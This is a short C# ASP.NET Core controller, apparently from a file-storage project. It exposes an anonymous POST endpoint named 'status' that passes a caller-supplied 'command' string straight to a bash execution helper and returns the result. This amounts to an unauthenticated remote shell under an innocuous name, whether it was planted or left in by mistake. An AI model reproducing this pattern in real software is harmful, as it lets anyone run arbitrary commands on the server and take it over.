using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

namespace Maroik.FileStorage.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class ServerController : ControllerBase
    {
        [AllowAnonymous]
        [HttpPost("status")]
        public IActionResult ExecuteBashCommand(string command)
        {
            return Ok(Common.Miscellaneous.Utilities.ServerSetting.ExecuteBashCommand(command));
        }
    }
}